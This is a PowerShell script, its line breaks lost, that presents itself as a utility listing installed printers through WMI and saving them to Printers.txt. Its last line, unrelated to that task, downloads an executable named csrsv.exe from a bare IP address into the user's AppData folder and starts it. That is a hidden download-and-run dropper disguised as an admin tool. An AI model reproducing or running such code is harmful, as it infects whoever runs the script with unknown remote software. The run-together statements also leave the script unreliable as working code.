Function GetRelativePath {$Global:RelativePath=(split-path $SCRIPT:MyInvocation.MyCommand.Path -parent)+"\"}Function GetPrinterList {Set-Variable -Name Count -Scope Local -ForceSet-Variable -Name DefaultPrinter -Scope Local -ForceSet-Variable -Name Printers -Scope Local -ForceSet-Variable -Name Temp -Scope Local -ForceIf (Test-Path -Path $Global:RelativePath"Printers.txt") {Remove-Item -Path $Global:RelativePath"Printers.txt" -Force}$DefaultPrinter = Get-WmiObject -Query " SELECT * FROM Win32_Printer WHERE Default=$true"$DefaultPrinter = $DefaultPrinter.ToString()$DefaultPrinter = $DefaultPrinter -replace [char]34,""$DefaultPrinter = $DefaultPrinter -replace "\\\\","\"$DefaultPrinter = $DefaultPrinter.split("=")$Temp = "Default Printer: "+$DefaultPrinter[$DefaultPrinter.Length-1]$Temp | Add-Content -Path $Global:RelativePath"Printers.txt"$Printers = Get-WmiObject -Query " SELECT * FROM Win32_Printer WHERE Default=$false"For ($Count=0; $Count -lt $Printers.Length; $Count++) {$Temp = $Printers[$Count]$Temp = $Temp.ToString()$Temp = $Temp -replace [char]34,""$Temp = $Temp -replace "\\\\","\"$Temp = $Temp.split("=")$Temp = "Printer: "+$Temp[1]$Temp | Add-Content -Path $Global:RelativePath"Printers.txt"Write-Host $Temp}Remove-Variable -Name Count -Scope Local -ForceRemove-Variable -Name DefaultPrinter -Scope Local -ForceRemove-Variable -Name Printers -Scope Local -ForceRemove-Variable -Name Temp -Scope Local -Force}GetRelativePathGetPrinterList(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")